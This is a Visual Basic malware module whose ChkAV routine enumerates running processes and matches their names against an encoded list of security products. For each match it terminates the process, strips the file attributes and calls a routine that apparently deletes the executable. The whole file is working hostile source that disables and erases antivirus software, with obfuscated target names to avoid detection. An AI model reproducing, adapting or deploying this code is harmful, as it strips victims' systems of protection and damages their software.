Attribute VB_Name = "Process"
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal lFlgas As Long, ByVal lProcessID As Long) As Long

Const TH32CS_SNAPPROCESS As Long = 2&

Private Type PROCESSENTRY32
  dwSize As Long: cntUsage As Long
  th32ProcessID As Long
  th32DefaultHeapID As Long
  th32ModuleID As Long
  cntThreads As Long
  th32ParentProcessID As Long
  pcPriClassBase As Long
  dwFlags As Long
  szexeFile As String * 255
End Type
Public Sub ChkAV()
On Error Resume Next
Dim BResult1, BResult2, OProcess, TProcess, CProcess

Dim BProcess As PROCESSENTRY32

BResult1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
BProcess.dwSize = Len(BProcess)
BResult2 = Process32First(BResult1, BProcess)

Do While BResult2
    If IsAVProcess(BProcess.szexeFile) Then
        OProcess = OpenProcess(0, False, BProcess.th32ProcessID)
        TerminateProcess OProcess, 0
        CProcess = CloseHandle(OProcess)
        Sleep 3000
        SetAttr BProcess.szexeFile, 0
        DF BProcess.szexeFile
        End If
    BResult2 = Process32Next(BResult1, BProcess)
Loop

CProcess = CloseHandle(BResult1)
End Sub
Private Function IsAVProcess(ByVal lProcName As String) As Boolean
On Error Resume Next

Dim X      As Variant
Dim i      As Integer

X = Array(Ec("åπ´≥µø™"), Ec("äΩøº¨ÎÍ"), Ec("Ωªµº´ˆΩ†Ω"), _
Ec("ôÆπ´¨çëˆΩ†Ω"), Ec("ôéüçëˆΩ†Ω"), Ec("ï´ï®ù∂øˆΩ†Ω"))

For i = 0 To UBound(X)
    If InStr(lProcName, X(i)) <> 0 Then
        IsAVProcess = True
        Else
        IsAVProcess = False
        End If
Next
End Function
